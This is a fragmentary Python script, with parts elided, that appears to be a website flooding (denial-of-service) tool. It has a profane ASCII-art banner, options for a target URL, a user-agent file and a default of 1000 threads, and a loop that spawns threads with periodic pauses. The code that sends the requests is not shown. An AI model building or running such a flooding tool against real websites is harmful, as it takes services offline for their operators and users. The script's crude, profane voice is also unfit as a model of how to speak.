...
|____/|_|_|____/ \___/____/
    ...
    print(colored("Shit Dick Dildos", 'yellow'))
    print(colored("oh ano pa hinihintay mo mag dildos kana shit ~literallyNothing", 'yellow'))

def parse_args():
    literallyNothing = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    literallyNothing.add_argument('-u','--user_agents',
                        dest = "user_agents",
                        help = "Filename of user agents file",
                        default = "user_agents.txt",
                        required = False)
    literallyNothing.add_argument('-t','--target',
                        dest = "target",
                        help = "Target website",
                        default = "http://example.com",
                        required = True)
    literallyNothing.add_argument('-tr','--threads',
                        dest = "threads",
                        help = "Number of threads",
                        default = 1000,
                        required = True)
    literallyNothing.add_argument('-s','--sleep',
                        dest = "sleep",
                        help = "Breakpoint after number of threads processed",
                        default = 100,
                        required = True)
    return literallyNothing.parse_args()
...
def main():
    ...
    for thread in range (1, threads):
        ...
        if thread % sleep == 0:
            time.sleep(10)
    t.join()
    print(colored("It's fucking done!", 'green'))
